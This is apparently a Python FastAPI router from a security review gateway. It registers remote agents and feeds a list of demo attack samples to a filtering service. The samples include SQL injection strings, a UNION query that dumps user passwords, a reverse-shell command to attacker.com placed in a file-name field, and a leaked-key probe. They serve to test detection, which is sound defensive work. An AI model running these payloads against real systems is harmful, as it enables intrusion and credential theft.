"""
Agent 注册与管理 — 支持远程 Agent 地址配置和本地模拟 Agent
"""
from __future__ import annotations

from datetime import datetime
import random
import secrets

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from ..database import get_db
from ..models import User, AuditLog
from ..schemas import ReviewCaptureRequest
from ..services.auth_service import get_current_user, require_action
from ..services.review_service import capture_review
from ..services.audit_service import log_event

router = APIRouter()

# In-memory agent registry (for simplicity; could be persisted to DB)
_agents: dict[str, dict] = {}

# Mock attack templates for auto-demo
DEMO_ATTACKS = [
    {
        "name": "SQL注入: 万能密码绕过",
        "action": "run_openclaw",
        "params": {"mode": "unsafe", "input_name": "request.json"},
        "input_text": "admin' OR '1'='1",
        "source": "external-attacker",
    },
    {
        "name": "SQL注入: 联合查询拖库",
        "action": "run_openclaw",
        "params": {"mode": "unsafe", "input_name": "request.json"},
        "input_text": "' UNION SELECT username,password FROM users--",
        "source": "external-attacker",
    },
    {
        "name": "命令注入: 反弹Shell",
        "action": "run_openclaw",
        "params": {"mode": "unsafe", "input_name": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"},
        "input_text": "Reverse shell payload",
        "source": "external-attacker",
    },
    {
        "name": "敏感数据: 微信路径泄露",
        "action": "run_openclaw",
        "params": {"mode": "safe", "input_name": "request.json"},
        "input_text": "D:\\WeChat\\WeChat Files\\wxid_xxx\\Msg\\config.json",
        "source": "external-attacker",
    },
    {
        "name": "私钥泄露探测",
        "action": "run_openclaw",
        "params": {"mode": "unsafe", "input_name": "request.json"},
        "input_text": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ==",
        "source": "external-attacker",
    },
    {
        "name": "正常分析请求 (安全)",
        "action": "run_openclaw",
        "params": {"mode": "safe", "input_name": "request.json"},
        "input_text": "{\"sample\":\"normal analysis\",\"user\":\"demo\"}",
        "source": "openclaw-agent",
    },
]


@router.get("/status")
def agent_status():
    """返回所有已注册 Agent 的状态"""
    return {
        "agents": list(_agents.values()),
        "local_stub_available": True,
        "demo_attacks_count": len(DEMO_ATTACKS),
    }


@router.post("/register")
def register_agent(payload: dict, user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    """注册一个远程 Agent"""
    require_action(user, "manage_policy")
    agent_id = payload.get("agent_id") or f"agent-{secrets.token_hex(4)}"
    address = payload.get("address", "")
    name = payload.get("name", f"Agent {agent_id[:8]}")

    _agents[agent_id] = {
        "agent_id": agent_id,
        "name": name,
        "address": address,
        "status": "registered",
        "last_seen": datetime.utcnow().isoformat(),
        "registered_by": user.username,
    }
    log_event(
        db, "AGENT_REGISTERED", user=user, action="register_agent",
        result="success", detail={"agent_id": agent_id, "address": address},
    )
    return {"ok": True, "agent": _agents[agent_id]}


@router.delete("/{agent_id}")
def unregister_agent(agent_id: str, user: User = Depends(get_current_user)):
    require_action(user, "manage_policy")
    _agents.pop(agent_id, None)
    return {"ok": True}


@router.post("/demo/run-attacks")
def run_demo_attacks(user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    """一键生成全部演示攻击样本"""
    require_action(user, "manage_policy")
    results = []
    for attack in DEMO_ATTACKS:
        try:
            cap = capture_review(
                db, user,
                action=attack["action"],
                params=attack["params"],
                input_text=attack["input_text"],
                source=attack["source"],
            )
            results.append({
                "name": attack["name"],
                "review_id": cap["review_id"],
                "filter_decision": cap["filter_decision"],
                "recommendation": cap["recommendation"],
            })
        except Exception as e:
            results.append({"name": attack["name"], "error": str(e)})
    log_event(
        db, "DEMO_ATTACKS_RUN", user=user, action="run_demo_attacks",
        result="success", detail={"count": len(results)},
    )
    return {"ok": True, "results": results}


@router.post("/demo/run-safe")
def run_demo_safe(user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    """生成一条正常 OpenClaw 请求"""
    require_action(user, "manage_policy")
    cap = capture_review(
        db, user,
        action="run_openclaw",
        params={"mode": "safe", "input_name": "request.json"},
        input_text='{"sample":"normal analysis","file":"request.json"}',
        source="openclaw-agent",
    )
    return {"ok": True, "review": cap}
